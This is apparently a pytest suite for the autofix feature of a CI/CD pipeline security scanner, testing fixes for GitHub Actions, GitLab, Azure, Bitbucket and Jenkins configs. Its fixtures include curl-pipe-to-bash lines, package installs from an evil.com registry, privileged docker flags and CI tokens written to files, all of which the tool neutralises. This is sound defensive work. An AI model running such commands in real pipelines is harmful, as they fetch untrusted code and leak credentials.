"""Tests for core.autofix."""
from __future__ import annotations

from pipeline_check.core import autofix
from pipeline_check.core.checks.base import Finding, Severity


def _finding(check_id: str, resource: str = "wf.yml") -> Finding:
    return Finding(
        check_id=check_id,
        title="x",
        severity=Severity.MEDIUM,
        resource=resource,
        description="",
        recommendation="",
        passed=False,
    )


def test_gha004_adds_permissions_block_before_jobs():
    wf = (
        "name: ci\n"
        "\n"
        "on: push\n"
        "\n"
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps: [{run: echo}]\n"
    )
    after = autofix.generate_fix(_finding("GHA-004"), wf)
    assert after is not None
    assert "permissions:\n  contents: read" in after
    # The inserted block sits above `jobs:`.
    assert after.index("permissions:") < after.index("jobs:")


def test_gha004_idempotent_when_block_exists():
    wf = (
        "name: ci\n"
        "permissions:\n"
        "  contents: read\n"
        "on: push\n"
        "jobs: {}\n"
    )
    assert autofix.generate_fix(_finding("GHA-004"), wf) is None


def test_generate_fix_returns_none_for_unknown_check_id():
    assert autofix.generate_fix(_finding("UNKNOWN-999"), "anything") is None


def test_render_patch_produces_unified_diff():
    patch = autofix.render_patch("wf.yml", "a\n", "b\n")
    assert "--- a/wf.yml" in patch
    assert "+++ b/wf.yml" in patch
    assert "-a" in patch
    assert "+b" in patch


def test_available_fixers_includes_gha004():
    assert "GHA-004" in autofix.available_fixers()


# ── Timeout fixers ─────────────────────────────────────────────────────


class TestGHA015Timeout:
    def test_inserts_timeout_in_job_missing_it(self):
        wf = (
            "jobs:\n"
            "  build:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - run: echo\n"
        )
        after = autofix.generate_fix(_finding("GHA-015"), wf)
        assert after is not None
        assert "build:\n    timeout-minutes: 30" in after

    def test_skips_job_with_timeout(self):
        wf = (
            "jobs:\n"
            "  build:\n"
            "    timeout-minutes: 10\n"
            "    runs-on: ubuntu-latest\n"
        )
        assert autofix.generate_fix(_finding("GHA-015"), wf) is None

    def test_does_not_inject_under_steps(self):
        wf = (
            "jobs:\n"
            "  build:\n"
            "    runs-on: ubuntu-latest\n"
            "    steps:\n"
            "      - run: echo\n"
        )
        after = autofix.generate_fix(_finding("GHA-015"), wf)
        assert after is not None
        assert "steps:\n      timeout-minutes" not in after


class TestGL015Timeout:
    def test_inserts_timeout_in_gitlab_job(self):
        gl = "build:\n  script:\n    - make\n"
        after = autofix.generate_fix(_finding("GL-015"), gl)
        assert after is not None
        assert "build:\n  timeout: 30 minutes" in after

    def test_skips_job_with_timeout(self):
        gl = "build:\n  timeout: 10 minutes\n  script:\n    - make\n"
        assert autofix.generate_fix(_finding("GL-015"), gl) is None

    def test_skips_gitlab_meta_keys(self):
        gl = "stages:\n  - build\nbuild:\n  script:\n    - make\n"
        after = autofix.generate_fix(_finding("GL-015"), gl)
        assert after is not None
        assert "stages:\n  timeout:" not in after


class TestADO015Timeout:
    def test_inserts_timeout_in_azure_job(self):
        ado = "jobs:\n  - job: Build\n    pool:\n      vmImage: ubuntu-latest\n"
        after = autofix.generate_fix(_finding("ADO-015"), ado)
        assert after is not None
        assert "Build\n    timeoutInMinutes: 30" in after

    def test_skips_job_with_timeout(self):
        ado = "jobs:\n  - job: Build\n    timeoutInMinutes: 15\n    pool:\n      vmImage: ubuntu\n"
        assert autofix.generate_fix(_finding("ADO-015"), ado) is None


# ── Curl-pipe comment-out ──────────────────────────────────────────────


class TestCurlPipeCommentOut:
    def test_comments_out_curl_bash(self):
        wf = "  - run: curl https://example.com/s.sh | bash\n"
        after = autofix.generate_fix(_finding("GHA-016"), wf)
        assert after is not None
        assert "TODO(pipelineguard)" in after

    def test_idempotent(self):
        wf = "  - run: curl https://example.com/s.sh | bash\n"
        after = autofix.generate_fix(_finding("GHA-016"), wf)
        assert autofix.generate_fix(_finding("GHA-016"), after) is None

    def test_cross_provider_bb(self):
        bb = "          - curl https://example.com | sh\n"
        assert autofix.generate_fix(_finding("BB-012"), bb) is not None

    def test_cross_provider_jf(self):
        jf = '        sh "curl https://example.com | bash"\n'
        assert autofix.generate_fix(_finding("JF-016"), jf) is not None


# ── Docker flag removal ────────────────────────────────────────────────


class TestDockerFlagRemoval:
    def test_strips_privileged(self):
        wf = "  - run: docker run --privileged ubuntu:latest cmd\n"
        after = autofix.generate_fix(_finding("GHA-017"), wf)
        assert after is not None
        assert "--privileged" not in after
        assert "docker run" in after

    def test_strips_host_mount(self):
        wf = "  - run: docker run -v /host:/mnt ubuntu:latest cmd\n"
        after = autofix.generate_fix(_finding("GHA-017"), wf)
        assert after is not None
        assert "-v /host:/mnt" not in after

    def test_idempotent(self):
        wf = "  - run: docker run --privileged ubuntu:latest\n"
        after = autofix.generate_fix(_finding("GHA-017"), wf)
        assert autofix.generate_fix(_finding("GHA-017"), after) is None

    def test_cross_provider_gl(self):
        gl = "    - docker run --net=host myimage\n"
        after = autofix.generate_fix(_finding("GL-017"), gl)
        assert after is not None
        assert "--net=host" not in after


# ── Package flag removal ───────────────────────────────────────────────


class TestPkgFlagRemoval:
    def test_strips_insecure_index_url(self):
        wf = "  - run: pip install --index-url http://evil.com/simple/ requests\n"
        after = autofix.generate_fix(_finding("GHA-018"), wf)
        assert after is not None
        assert "--index-url" not in after
        assert "pip install" in after

    def test_strips_trusted_host(self):
        wf = "  - run: pip install --trusted-host evil.com pkg\n"
        after = autofix.generate_fix(_finding("GHA-018"), wf)
        assert after is not None
        assert "--trusted-host" not in after

    def test_strips_npm_insecure_registry(self):
        wf = "  - run: npm install --registry=http://evil.com pkg\n"
        after = autofix.generate_fix(_finding("BB-014"), wf)
        assert after is not None
        assert "--registry" not in after

    def test_idempotent(self):
        wf = "  - run: pip install --trusted-host evil.com pkg\n"
        after = autofix.generate_fix(_finding("GHA-018"), wf)
        assert autofix.generate_fix(_finding("GHA-018"), after) is None


# ── Jenkins Groovy secret redaction ────────────────────────────────────


class TestJF008SecretRedaction:
    def test_redacts_aws_key(self):
        jf = '  AWS_KEY = "AKIAIOSFODNN7EXAMPLE"\n'
        after = autofix.generate_fix(_finding("JF-008", "Jenkinsfile"), jf)
        assert after is not None
        assert "<REDACTED>" in after
        assert "AKIAIOSFODNN7EXAMPLE" not in after

    def test_preserves_non_secret(self):
        jf = '  SAFE = "hello"\n'
        assert autofix.generate_fix(_finding("JF-008", "Jenkinsfile"), jf) is None

    def test_idempotent(self):
        jf = '  AWS_KEY = "AKIAIOSFODNN7EXAMPLE"\n'
        after = autofix.generate_fix(_finding("JF-008", "Jenkinsfile"), jf)
        assert autofix.generate_fix(_finding("JF-008", "Jenkinsfile"), after) is None


# ── BB-005 Bitbucket timeout ─────────────────────────────────────────


class TestBB005Timeout:
    def test_inserts_max_time(self):
        wf = "pipelines:\n  default:\n    - step:\n        script:\n          - make\n"
        after = autofix.generate_fix(_finding("BB-005"), wf)
        assert after is not None
        assert "max-time: 120" in after

    def test_idempotent(self):
        wf = "pipelines:\n  default:\n    - step:\n        max-time: 60\n        script:\n          - make\n"
        assert autofix.generate_fix(_finding("BB-005"), wf) is None


# ── JF-015 Jenkins timeout ───────────────────────────────────────────


class TestJF015Timeout:
    def test_inserts_todo(self):
        jf = "pipeline {\n    agent any\n    stages {\n    }\n}\n"
        after = autofix.generate_fix(_finding("JF-015", "Jenkinsfile"), jf)
        assert after is not None
        assert "TODO(pipelineguard): wrap with timeout" in after

    def test_idempotent(self):
        jf = "pipeline {\n    // TODO(pipelineguard): wrap with timeout(time: 30, unit: 'MINUTES')\n    agent any\n}\n"
        assert autofix.generate_fix(_finding("JF-015", "Jenkinsfile"), jf) is None


# ── GHA-001 pinning TODO ────────────────────────────────────────────


class TestGHA001PinningTodo:
    def test_adds_todo_to_unpinned_action(self):
        wf = "    - uses: actions/checkout@v4\n"
        after = autofix.generate_fix(_finding("GHA-001"), wf)
        assert after is not None
        assert "TODO(pipelineguard): pin to commit SHA" in after

    def test_skips_sha_pinned_action(self):
        wf = "    - uses: actions/checkout@4959ce089c2fe0a3ab7b3aaa3aebc6a0a17b2af9\n"
        assert autofix.generate_fix(_finding("GHA-001"), wf) is None

    def test_idempotent(self):
        wf = "    - uses: actions/checkout@v4  # TODO(pipelineguard): pin to commit SHA\n"
        assert autofix.generate_fix(_finding("GHA-001"), wf) is None


# ── GL-001 image pinning TODO ────────────────────────────────────────


class TestGL001PinningTodo:
    def test_adds_todo_to_unpinned_image(self):
        wf = "  image: python:3.12\n"
        after = autofix.generate_fix(_finding("GL-001"), wf)
        assert after is not None
        assert "TODO(pipelineguard): pin to digest" in after

    def test_skips_digest_pinned_image(self):
        wf = "  image: python@sha256:abc123\n"
        assert autofix.generate_fix(_finding("GL-001"), wf) is None


# ── Token persistence comment-out ────────────────────────────────────


class TestTokenPersistenceCommentOut:
    def test_gha019_comments_out_token_line(self):
        wf = '  - run: echo $GITHUB_TOKEN >> .env\n'
        after = autofix.generate_fix(_finding("GHA-019"), wf)
        assert after is not None
        assert "WARNING(pipelineguard)" in after
        assert "# - run:" in after or "# echo" in after

    def test_gl020_comments_out_token_line(self):
        wf = "  - echo $CI_JOB_TOKEN >> /tmp/token.txt\n"
        after = autofix.generate_fix(_finding("GL-020"), wf)
        assert after is not None
        assert "WARNING(pipelineguard)" in after

    def test_idempotent(self):
        wf = "  # WARNING(pipelineguard): token written to persistent storage — remove this line\n  # echo $GITHUB_TOKEN >> .env\n"
        assert autofix.generate_fix(_finding("GHA-019"), wf) is None


# ── GHA-014 deploy environment stub ──────────────────────────────────


class TestGHA014DeployEnvStub:
    def test_inserts_environment_into_deploy_job(self):
        wf = "jobs:\n  deploy:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n"
        after = autofix.generate_fix(_finding("GHA-014"), wf)
        assert after is not None
        assert "environment:" in after
        assert "TODO(pipelineguard)" in after

    def test_skips_job_with_existing_environment(self):
        wf = "jobs:\n  deploy:\n    environment: production\n    runs-on: ubuntu-latest\n"
        assert autofix.generate_fix(_finding("GHA-014"), wf) is None

    def test_skips_non_deploy_job(self):
        wf = "jobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo hi\n"
        assert autofix.generate_fix(_finding("GHA-014"), wf) is None
